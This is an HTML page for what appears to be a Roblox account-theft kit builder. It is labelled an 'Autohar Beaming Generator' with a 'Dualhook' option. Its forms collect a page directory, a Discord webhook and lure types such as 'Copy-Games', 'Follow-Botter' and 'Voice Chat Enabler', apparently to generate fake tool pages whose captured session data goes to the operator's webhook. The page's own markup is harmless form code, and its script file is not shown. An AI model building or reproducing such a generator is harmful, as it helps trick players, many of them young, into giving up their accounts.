<html>
    <head>
        <title>Create</title>
        <link rel="stylesheet" href="/../apis/css/style.css">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"> 
    </head>
    <body>
        
    <div class="container" id="container">
        <div class="form-container sign-up-container">
            <!-- Dualhook form -->
            <form action="" method="">
                <h1>Create Dualhook</h1>
                
                <span>Create your own Autohar Beaming Generator.</a></span>
                <input type="text" name="dir" placeholder="Directory here.." required/>
                <input type="url" name="web" placeholder="Webhook here.." required/>
                <input type="text" name="name" placeholder="Name here.." required/>
                <input type="url" name="thumb" placeholder="Thumbnail URL here.." required/>
                <input type="url" name="dc" placeholder="Discord Invite Link.." required/>
                <input type="hidden" name="t" value="dh">
                <select name="t" disabled>
                    <option value="dh" selected>Dualhook (Generator)</option>
                </select> 
                <button type="submit">Create</button>
            </form>
        </div>
        <div class="form-container sign-in-container">
            <!-- regular form-->
            <form action="" method="">
                <h1>Create Regular</h1>
                
                <span>Create your very own AutoHar Page</span>
                <input type="text" placeholder="Directory here.." name="dir" required>
                <input type="url" placeholder="Webhook here.." name="web" required>
                <select name="t" required>
                    <option value="fb">Follow-Botter</option>
                    <option value="gc">Copy-Games (BEST)</option>
                    <option value="cc">Copy-Clothes</option>
                    <option value="lc">Limiteds Checker</option>
                    <option value="vc">Voice Chat Enabler</option>
                </select>
                <button type="submit">Create</button>
            </form>
        </div>
        <div class="overlay-container">
            <div class="overlay">
                <div class="overlay-panel overlay-left">
                    <h1>Create Regular</h1>
                    <p>WARNING: WHEN CREATING DUALHOOK SITES PLEASE USE PERMANENT IMAGE URL'S AND PERMANENT DISCORD INVITES (NEVER ENDING)!!!</p>
                    <button class="ghost" id="signIn">Create Now</button>
                </div>
                <div class="overlay-panel overlay-right">
                    <h1>Create Dualhook</h1>
                    <p>Create your own Dualhooked Generator</p>
                    <button class="ghost" id="signUp">Create Now</button>
                </div>
            </div>
        </div>
    </div>
    <script src="main.js"></script>
    
</body>
</html>